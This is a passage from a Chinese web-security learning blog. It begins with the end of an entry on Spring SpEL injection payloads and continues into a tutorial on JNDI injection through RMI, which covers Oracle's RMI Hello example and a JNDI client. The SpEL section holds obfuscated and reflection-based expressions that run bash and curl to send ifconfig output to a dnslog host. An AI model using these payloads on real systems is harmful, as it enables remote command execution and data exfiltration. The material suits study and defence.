punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">67</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="反射异变"><a href="#反射异变" class="headerlink" title="反射异变"></a>反射异变</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java">#<span class="token punctuation">{</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"curl test.ww4ply.dnslog.cn/`ifconfig '\n' '-'`"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 学习记录 </tag>
            
            <tag> java web </tag>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java_web学习之路(四)：JNDI注入</title>
      <link href="/2022/03/25/jndi-inj/"/>
      <url>/2022/03/25/jndi-inj/</url>
      
        <content type="html"><![CDATA[<h1 id="java-web学习之路-四-：JNDI注入"><a href="#java-web学习之路-四-：JNDI注入" class="headerlink" title="java_web学习之路(四)：JNDI注入"></a>java_web学习之路(四)：JNDI注入</h1><h1 id="从零学习利用RMI进行JNDI注入"><a href="#从零学习利用RMI进行JNDI注入" class="headerlink" title="从零学习利用RMI进行JNDI注入"></a>从零学习利用RMI进行JNDI注入</h1><h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>先来看看oracle官方对于JNDI的描述</p><blockquote><p>The Java Naming and Directory Interface (JNDI) is an application programming interface (API) that provides <a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/naming.html">naming</a> and <a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/directory.html">directory</a> functionality to applications written using the JavaTM programming language. It is defined to be independent of any specific directory service implementation. Thus a variety of directories–new, emerging, and already deployed–can be accessed in a common way.</p></blockquote><p><img src="https://s2.loli.net/2022/04/02/PvGNuwLE3FgjxH6.jpg"></p><p>笔者的英语水平捉襟见肘，但读者们对于这一段英文描述应该能够大概理解：</p><p>JNDI的全名是The Java Naming and Directory Interface ，翻译过来就是JAVA命名和目录接口，它是为JAVA应用程序提供命名和目录访问服务的API。那么在JAVA中，什么是命名（Naming）和目录（Directory）呢？</p><h3 id="JNDI中的命名（Naming）"><a href="#JNDI中的命名（Naming）" class="headerlink" title="JNDI中的命名（Naming）"></a>JNDI中的命名（Naming）</h3><p>JNDI中的命名操作，就是将Java对象以某个名称的形式绑定到一个容器（Context）环境中，以后调用容器的lookup方法可以查找到某个名称所绑定的对象，方便后续利用。容器（Context）本身也是一个Java对象，也即是说，存在一种套娃行为，即把一个容器用一个名称绑定到另一个容器上，产生父子级联的关系，形成一种树状结构。</p><p>如果我们想获得Context树中的一个Java对象，首先要得到这个Java对象所在的Context对象，<strong>当我们调用某个Context对象的lookup方法时，我么不仅仅只能获取到当前Context容器中绑定的对象，只需要在lookup方法中指定相应的Context路径，我们可以获取到Context树中所绑定的任何一个对象</strong>。类似于文件的相对路径。</p><p>无论如何，程序必须获得一个作为操作入口的Context对象后才能执行各种JNDI命名操作，为此，JNDI API中提供了一个InitialContext类来创建用作JNDI命名操作的入口Context对象。Context是一个接口，Context对象实际上是Context的某个实现类的实例对象，选择这个具体的Context实现类并创建其实例对象的过程是由一个Context工厂类来完成的，这个工厂类的类名可以通过JNDI的环境属性java.naming.factory.initial指定，也可以根据Context的操作方法的url参数的Schema来选择。</p><h3 id="JNDI中的目录（Directory）"><a href="#JNDI中的目录（Directory）" class="headerlink" title="JNDI中的目录（Directory）"></a>JNDI中的目录（Directory）</h3><p>首先我们要对JNDI目录的概念有一个了解，JNDI目录与文件系统中的目录概念区别很大，JNDI目录是指将一个对象的所有属性信息保存到一个容器环境中，JNDI API中提供的代表目录容器环境的类为DirContext，DirContext是Context的子类，所以DirContext也能实现父类的命名操作。DirContext是对Context的扩展，它在Context的基础上增加了对目录属性的操作功能，可以在其中绑定对象的属性信息和查找对象的属性信息。与Context的操作原理类似，JNDI API中提供了一个InitialDirContext类来创建用作JNDI命名与目录属性操作的入口DirContext对象。</p><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>讲明白JNDI注入必然逃不掉RMI，在低版本(&lt;6u132||7u122||8u113)的jdk中，使用RMI配合JNDI注入是很方便的攻击方式（同时也是上古时期的JNDI注入利用方式）</p><p>我们先看看wiki对于RMI的解释：</p><blockquote><h1 id="Java-remote-method-invocation"><a href="#Java-remote-method-invocation" class="headerlink" title="Java remote method invocation"></a>Java remote method invocation</h1><p>In <a href="https://en.wikipedia.org/wiki/Computing">computing</a>, the <strong>Java Remote Method Invocation</strong> (<strong>Java RMI</strong>) is a <a href="https://en.wikipedia.org/wiki/Java_(programming_language)">Java</a> <a href="https://en.wikipedia.org/wiki/Application_programming_interface">API</a> that performs <a href="https://en.wikipedia.org/wiki/Remote_method_invocation">remote method invocation</a>, the object-oriented equivalent of <a href="https://en.wikipedia.org/wiki/Remote_procedure_call">remote procedure calls</a> (RPC), with support for direct transfer of <a href="https://en.wikipedia.org/wiki/Serialization#Java">serialized</a> Java classes and <a href="https://en.wikipedia.org/wiki/Distributed_Garbage_Collection">distributed garbage-collection</a>.</p></blockquote><p>remote method invocation，从英文字面的意思我们就能理解，RMI实际上就是一个实现调用远程类方法（在网络上提前部署好的类方法）的Java API，将需要的类部署于网络方便开发者进行方法调用。</p><h3 id="Oracle官方的例子"><a href="#Oracle官方的例子" class="headerlink" title="Oracle官方的例子"></a>Oracle官方的例子</h3><p>我们直接去Oracle官方的文档查看RMI最简单的例子。</p><p>在这个example中一共需要三个文件：</p><ul><li>Hello.java</li><li>Server.java</li><li>Client.java</li></ul><p>要实现RMI，RMI的客户端和服务端都需要实现一个接口，这个接口就是上面的Hello.java：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Remote</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Hello</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">{</span>    <span class="token class-name">String</span> sayHello <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>服务端代码 Server.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">UnicastRemoteObject</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Server</span> <span class="token keyword">implements</span> <span class="token class-name">Hello</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">Server</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"Hello, world!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">Server</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Server</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Hello</span> stub <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Hello</span><span class="token punctuation">)</span> <span class="token class-name">UnicastRemoteObject</span><span class="token punctuation">.</span><span class="token function">exportObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Bind the remote object's stub in the registry</span>            <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">,</span> stub<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Server ready"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Server exception: "</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>客户端代码 Client.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">Client</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> host <span class="token operator">=</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Hello</span> stub <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Hello</span><span class="token punctuation">)</span> registry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> response <span class="token operator">=</span> stub<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"response: "</span> <span class="token operator">+</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Client exception: "</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先运行Server.java，看到抛出了Server ready表示服务端已经准备好。接着我们去运行Client.java，成功运行helloworld：</p><p><img src="https://s2.loli.net/2022/04/02/SU1XEonNbfqOBti.png" alt="image-20220325204027364"></p><p>首先，像我们刚才说的那样，有一个extends Remote的接口Hello.java，可以供Server.java实现。</p><p>在Server.java中，我们先是重写了sayHello这个方法，使其输出字符串，在main方法中做了如下操作：</p><ul><li><code>Hello stub = (Hello) UnicastRemoteObject.exportObject(obj, 0);</code>：生成一个实例stub，stub（存根）看作远程对象在本地的一个代理，包括远程对象的具体信息，客户端可以通过这个代理和服务端进行交互，其中存在已经重写完的sayHello方法。</li><li><code>Registry registry = LocateRegistry.createRegistry(1099);</code>：实现“RMI注册表”，端口为1099</li><li><code>registry.bind("Hello", stub);</code>：将Hello与stub绑定，实现RMI注册。</li></ul><p>启动Server.java之后，我们运行Client.java，主要操作：</p><ul><li><code>Registry registry = LocateRegistry.getRegistry(1099);</code>：获取远程（在本例中是本地起的模拟远程服务）的RMI注册表。指定端口为1099</li><li><code>Hello stub = (Hello) registry.lookup("Hello");</code>：获取服务端中Hello所对应的类对象，并且实例化，注意**registry.lookup(“Hello”)**实现了在注册表中查询的功能</li><li>后面就是调用sayHello方法，不再叙述</li></ul><p><img src="https://s2.loli.net/2022/04/02/IMrdJgS45Ns6bUk.png" alt="image-20220402223543021"></p><h2 id="利用RMI进行JNDI注入"><a href="#利用RMI进行JNDI注入" class="headerlink" title="利用RMI进行JNDI注入"></a>利用RMI进行JNDI注入</h2><p>梳理完了上面所说的RMI案例，我们很快就能意识到，RMI的功能本身是存在漏洞问题的。RMI从宏观角度来说，是加载一个远程的类方法，使其能在本地被调用。那如果我们部署一个恶意类，让Client去加载，就能实现对Client端的攻击。</p><h3 id="JNDI与RMI的关系"><a href="#JNDI与RMI的关系" class="headerlink" title="JNDI与RMI的关系"></a>JNDI与RMI的关系</h3><p>既然我们要实现利用RMI进行JNDI注入，我们就得首先理清JNDI与RMI的关系。我们回到文章开头的这张图上：</p><p><img src="https://s2.loli.net/2022/04/02/bRpDJ7GEF5reog1.jpg"></p><p>这是oracle官方挂的JNDI架构图，我们能发现JNDI主要由JNDI API和JNDI SPI两部分组成，Java应用程序通过JNDI API访问目录服务，而JNDI API会调用Naming Manager实例化JNDI SPI，然后通过JNDI SPI去操作命名或目录服务器如LDAP， DNS，RMI等，JNDI内部已实现了对LDAP，DNS， RMI等目录服务器的操作API。</p><p>也就是说，RMI在JNDI这里，就是我们之前提到的Context或者DirContext对象。我们可以利用JNDI加载RMI的远程方法。我们来看看代码是怎么实现的。之前演示RMI的Server.java不用修改（不用洗锅qwq），我们编辑一个JNDI客户端代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Context</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JNDIClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token class-name">Properties</span> properties <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        properties<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span>INITIAL_CONTEXT_FACTORY<span class="token punctuation">,</span> <span class="token string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        properties<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span>PROVIDER_URL<span class="token punctuation">,</span> <span class="token string">"rmi://localhost:1099"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Context</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span>properties<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Hello</span> stub <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Hello</span><span class="token punctuation">)</span> context<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"rmi://localhost:1099/Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>stub<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>启动Server.java之后运行JNDIClient.java可以发现成功输出了Hello World。我们来对JNDIClient.java的代码进行解释：</p><p>Context.INITIAL_CONTEXT_FACTORY指定JNDI具体处理的类名称，例如RMI为<strong>com.sun.jndi.rmi.registry.RegistryContextFactory</strong>，<strong>LDAP为com.sun.jndi.ldap.LdapCtxFactory</strong>。</p><p><code>properties.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");</code></p><p><code>properties.put(Context.PROVIDER_URL, 